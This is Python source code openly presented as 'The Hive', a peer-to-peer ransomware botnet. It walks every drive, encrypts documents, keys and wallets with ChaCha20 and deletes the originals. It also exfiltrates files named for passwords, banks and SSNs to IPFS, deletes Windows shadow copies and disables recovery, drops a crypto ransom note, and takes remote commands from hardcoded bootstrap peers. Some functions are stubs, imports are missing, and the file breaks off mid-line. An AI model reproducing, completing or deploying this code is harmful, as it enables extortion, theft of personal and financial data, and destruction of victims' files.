'''VARIANT 3: THE HIVE (PYTHON)

Original Essence: P2P mesh network, blockchain commands, distributed
Python Adaptation: Uses libp2p for P2P, web3 for Ethereum, chacha20 for encryption'''
# THE HIVE - PYTHON P2P RANSOMWARE BOTNET

import os
import sys
import json
import time
import random
import hashlib
import threading
import socket
import requests
import base64
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2
import libp2p
from libp2p import new_node
from libp2p.peer.peerinfo import info_from_p2p_addr
from web3 import Web3
import multiaddr
import asyncio

class HiveNode:
    def __init__(self, bootstrap_nodes=None):
        # Node identity
        self.node_id = self.generate_node_id()
        self.peers = []
        self.bootstrap_nodes = bootstrap_nodes or [
            "/ip4/45.77.45.77/tcp/4001/p2p/QmBootstrap1",
            "/ip4/155.138.212.55/tcp/4001/p2p/QmBootstrap2"
        ]
        
        # Encryption
        self.master_key = os.urandom(32)
        self.file_keys = {}
        
        # Blockchain connection (Ethereum testnet)
        self.w3 = Web3(Web3.HTTPProvider('https://ropsten.infura.io/v3/YOUR_PROJECT_ID'))
        self.contract_address = '0x1234567890123456789012345678901234567890'
        
        # Target extensions
        self.target_exts = [
            '.docx', '.xlsx', '.pptx', '.pdf', '.txt', '.jpg', 
            '.png', '.zip', '.sql', '.db', '.kdbx', '.pem', 
            '.key', '.ovpn', '.wallet', '.vmdk'
        ]
        
        # Exclude dirs
        self.exclude_dirs = [
            'Windows', 'Program Files', 'Program Files (x86)',
            '$Recycle.Bin', 'System32', 'boot', 'AppData'
        ]
        
        # Encrypted files list
        self.encrypted_files = []
        
        # Start P2P node
        self.start_p2p()
    
    def generate_node_id(self):
        """Generate unique node ID"""
        hostname = socket.gethostname()
        mac = hex(uuid.getnode())[2:]
        return hashlib.sha256(f"{hostname}-{mac}-{random.random()}".encode()).hexdigest()[:16]
    
    def start_p2p(self):
        """Start libp2p node"""
        async def run_node():
            # Create libp2p node
            self.node = await new_node(transport=['/ip4/0.0.0.0/tcp/0'])
            await self.node.get_network().listen(multiaddr.Multiaddr("/ip4/0.0.0.0/tcp/0"))
            
            # Connect to bootstrap nodes
            for bootstrap in self.bootstrap_nodes:
                try:
                    peer_info = info_from_p2p_addr(multiaddr.Multiaddr(bootstrap))
                    await self.node.connect(peer_info)
                    self.peers.append(peer_info.peer_id)
                except:
                    pass
            
            # Set up protocols
            self.node.set_stream_handler("/hive/commands/1.0.0", self.handle_commands)
            self.node.set_stream_handler("/hive/keys/1.0.0", self.handle_key_exchange)
            
            # Start periodic peer discovery
            asyncio.create_task(self.discover_peers())
        
        # Run in background thread
        def run_async():
            asyncio.run(run_node())
        
        threading.Thread(target=run_async, daemon=True).start()
    
    async def discover_peers(self):
        """Discover new peers via DHT"""
        while True:
            try:
                # Query DHT for peers
                # ...
                await asyncio.sleep(60)
            except:
                pass
    
    async def handle_commands(self, stream):
        """Handle incoming commands from peers"""
        data = await stream.read()
        command = json.loads(data.decode())
        
        if command['type'] == 'encrypt':
            # Encrypt files command
            threading.Thread(target=self.encrypt_all_drives).start()
        
        elif command['type'] == 'exfiltrate':
            # Exfiltrate specific files
            threading.Thread(target=self.exfiltrate_data, args=(command['patterns'],)).start()
        
        elif command['type'] == 'update':
            # Update ransomware version
            self.update_payload(command['url'])
        
        elif command['type'] == 'shutdown':
            # Self-destruct
            sys.exit(0)
        
        await stream.close()
    
    async def broadcast_command(self, command_type, data=None):
        """Broadcast command to all peers"""
        command = {
            'type': command_type,
            'data': data,
            'sender': self.node_id,
            'timestamp': time.time()
        }
        
        for peer in self.peers:
            try:
                stream = await self.node.new_stream(peer, ["/hive/commands/1.0.0"])
                await stream.write(json.dumps(command).encode())
                await stream.close()
            except:
                pass
    
    def encrypt_file_chacha20(self, filepath):
        """Encrypt file with ChaCha20-Poly1305"""
        try:
            # Check if already encrypted
            if filepath.endswith('.hive'):
                return False
            
            with open(filepath, 'rb') as f:
                plaintext = f.read()
            
            # Generate random key and nonce for this file
            file_key = os.urandom(32)
            nonce = os.urandom(12)
            
            # Create ChaCha20 cipher
            algorithm = algorithms.ChaCha20(file_key, nonce)
            cipher = Cipher(algorithm, mode=None)
            encryptor = cipher.encryptor()
            
            # Encrypt
            ciphertext = encryptor.update(plaintext) + encryptor.finalize()
            
            # Store file key (encrypted with master key)
            encrypted_key = self.encrypt_with_master(file_key)
            
            # Write encrypted file
            with open(filepath + '.hive', 'wb') as f:
                f.write(len(encrypted_key).to_bytes(4, 'big'))
                f.write(encrypted_key)
                f.write(nonce)
                f.write(ciphertext)
            
            # Remove original
            os.remove(filepath)
            
            # Store key info for potential recovery (distributed)
            self.file_keys[filepath] = {
                'encrypted_key': encrypted_key,
                'nonce': nonce
            }
            
            return True
        except Exception as e:
            return False
    
    def encrypt_with_master(self, key):
        """Encrypt file key with master key"""
        # Use AES-256-GCM
        from Crypto.Cipher import AES
        cipher = AES.new(self.master_key, AES.MODE_GCM)
        ciphertext, tag = cipher.encrypt_and_digest(key)
        return cipher.nonce + tag + ciphertext
    
    def walk_and_encrypt(self):
        """Walk all drives and encrypt"""
        if sys.platform == 'win32':
            import win32api
            drives = [d for d in win32api.GetLogicalDriveStrings().split('\x00') if d]
        else:
            drives = ['/']
        
        for drive in drives:
            for root, dirs, files in os.walk(drive):
                # Skip excluded dirs
                skip = False
                for excl in self.exclude_dirs:
                    if excl in root:
                        skip = True
                        break
                if skip:
                    continue
                
                for file in files:
                    if any(file.lower().endswith(ext) for ext in self.target_exts):
                        filepath = os.path.join(root, file)
                        self.encrypt_file_chacha20(filepath)
    
    def encrypt_all_drives(self):
        """Encrypt all drives (thread target)"""
        self.walk_and_encrypt()
        
        # Store encrypted keys in blockchain for distributed recovery
        self.store_keys_on_blockchain()
        
        # Broadcast encryption event to peers
        asyncio.run(self.broadcast_command('encrypt_complete', {
            'node': self.node_id,
            'file_count': len(self.file_keys)
        }))
    
    def exfiltrate_data(self, patterns=None):
        """Find and exfiltrate high-value data"""
        patterns = patterns or ['password', 'bank', 'credit', 'ssn', 'wallet']
        high_value_files = []
        
        for root, dirs, files in os.walk('C:\\'):
            for file in files:
                if any(pattern in file.lower() for pattern in patterns):
                    filepath = os.path.join(root, file)
                    high_value_files.append(filepath)
        
        # Upload to IPFS or other decentralized storage
        for filepath in high_value_files[:10]:  # Limit to first 10
            with open(filepath, 'rb') as f:
                data = f.read()
            
            # Encrypt for exfiltration
            encrypted = self.encrypt_with_master(data)
            
            # Upload to IPFS
            try:
                import ipfshttpclient
                client = ipfshttpclient.connect()
                res = client.add_bytes(encrypted)
                # Store hash in blockchain
                self.store_ipfs_hash_on_blockchain(res['Hash'], filepath)
            except:
                pass
    
    def store_keys_on_blockchain(self):
        """Store encrypted keys in Ethereum smart contract"""
        # Pack keys into transaction data
        keys_data = json.dumps({
            'node_id': self.node_id,
            'keys': [k.hex() for k in self.file_keys.values()]
        })
        
        # Send to smart contract
        # This would interact with a deployed contract
        # that stores hashes of keys for ransom payment
    
    def store_ipfs_hash_on_blockchain(self, ipfs_hash, filename):
        """Store IPFS hash in blockchain for ransom negotiation"""
        # ...
        pass
    
    def check_blockchain_for_commands(self):
        """Poll blockchain for commands from C2"""
        def poll():
            while True:
                # Get latest block
                latest = self.w3.eth.block_number
                
                # Look for events from our contract
                # ...
                
                time.sleep(60)
        
        threading.Thread(target=poll, daemon=True).start()
    
    def disable_recovery(self):
        """Disable system recovery"""
        if sys.platform == 'win32':
            subprocess.run("vssadmin delete shadows /all /quiet", shell=True)
            subprocess.run("bcdedit /set {default} recoveryenabled No", shell=True)
    
    def show_ransom_note(self):
        """Show ransom note with blockchain payment address"""
        note = f"""
        ===== THE HIVE =====
        
        YOUR FILES HAVE BEEN ENCRYPTED BY THE HIVE BOTNET
        
        Node ID: {self.node_id}
        Peers: {len(self.peers)}
        
        Your files are encrypted with military-grade ChaCha20-Poly1305.
        The keys are distributed across {len(self.peers)} nodes in the hive.
        No single node can decrypt your files.
        
        To recover your files, you must pay to the following address:
        
        ETH: 0xHiveXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
        BTC: 1HiveXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
        
        After payment, your decryption key will be automatically
        released via the blockchain smart contract.
        
        DO NOT attempt to decrypt yourself.
        DO NOT shut down - it may corrupt files permanently.
        ============================================
        """
        
        desktop = os.path.join(os.environ.get('USERPROFILE', '/'), 'Desktop')
        with open(os.path.join(desktop, 'HIVE_README.txt'), 'w') as f:
            f.write(note)
        
        # Also show popup
        if sys.platform == 'win32':
            import ctypes
            ctypes.windll.user32.MessageBoxW(0, note, "THE HIVE", 0x30)
    
    def run(self):
        """Main execution"""
        # Check blockchain for commands
        self.check_blockchain_for_commands()
        
        # Disable recovery
        self.disable_recovery()
        
        # Encrypt files
        self.enc